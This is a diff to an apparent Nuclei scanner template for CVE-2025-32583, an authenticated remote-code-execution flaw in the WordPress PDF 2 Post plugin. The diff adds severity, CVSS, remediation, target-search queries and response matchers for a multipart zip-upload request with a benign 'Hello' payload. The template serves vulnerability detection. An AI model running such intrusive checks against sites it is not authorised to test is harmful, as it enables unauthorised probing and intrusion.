@@ -1,14 +1,32 @@
-id: 2025-32583
+id: CVE-2025-32583
 
 info:
-  name: WordPress PDF 2 Post RCE Exploit <= 2.4.0 - Authenticated Remote Code Execution
+  name: WordPress PDF 2 Post <= 2.4.0 - Authenticated Remote Code Execution
   author: pussycat0x
-  severity: high
+  severity: critical
   description: |
     Improper Control of Generation of Code ('Code Injection') vulnerability in termel PDF 2 Post allows Remote Code Inclusion. This issue affects PDF 2 Post: from n/a through 2.4.0.
+  impact: |
+    An authenticated attacker can exploit this vulnerability to execute arbitrary code on the server.
+  remediation: |
+    Update WordPress PDF 2 Post plugin to version 2.4.1 or later.
   reference:
     - https://github.com/Nxploited/CVE-2025-32583
-  tags: cve,cve2025,wordpress,wp-plugin,rce,plugin,pdf2rce
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-32583
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.9
+    cve-id: CVE-2025-32583
+    cwe-id: CWE-94
+    cpe: cpe:2.3:a:termel:pdf_2_post:*:*:*:*:*:wordpress:*:*
+  metadata:
+    max-request: 3
+    vendor: termel
+    product: pdf_2_post
+    verified: false
+    shodan-query: http.component:"WordPress"
+    fofa-query: body="wp-content" && body="pdf2post"
+  tags: cve,cve2025,wordpress,wp-plugin,rce,auth,intrusive
 
 variables:
   filename: {{base64(gzip("Hello"))}}
@@ -33,7 +51,6 @@ http:
         Accept-Encoding: gzip, deflate, br
         Accept: */*
         Connection: keep-alive
-        Content-Length: 711
         Content-Type: multipart/form-data; boundary=57fbacb93533400815c1e2ec994fe293
 
         --57fbacb93533400815c1e2ec994fe293
@@ -42,14 +59,28 @@ http:
         {{pdf2post_upload_nonce}}
         --57fbacb93533400815c1e2ec994fe293
         Content-Disposition: form-data; name="_wp_http_referer"
+
         /wp-admin/edit.php?page=new-post-from-pdf
         --57fbacb93533400815c1e2ec994fe293
         Content-Disposition: form-data; name="pdf_file_to_upload"; filename="{{randstr}}.zip"
         Content-Type: application/zip
+
         {{filename}}
         --57fbacb93533400815c1e2ec994fe293--
 
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
 
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "uploaded"
+          - "processed"
+        condition: or
 
     extractors:
       - type: regex
